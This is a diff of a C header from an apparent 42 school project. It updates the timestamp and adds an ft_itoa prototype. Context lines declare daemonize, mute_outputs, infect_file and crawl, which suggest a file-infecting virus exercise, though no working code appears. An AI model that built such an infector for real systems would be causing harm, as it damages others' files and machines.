@@ -6,7 +6,7 @@
 /*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/03/04 11:29:36 by mbatty            #+#    #+#             */
-/*   Updated: 2026/05/27 14:41:53 by pboucher         ###   ########.fr       */
+/*   Updated: 2026/06/02 18:02:25 by pboucher         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -44,6 +44,7 @@ int		daemonize();
 int		mute_outputs();
 
 char	*strjoin(char const *s1, char const *s2);
+char	*ft_itoa(int n);
 
 int		infect_file(t_exec_ctx *ctx, const char *path);
 int		crawl(t_exec_ctx *ctx);
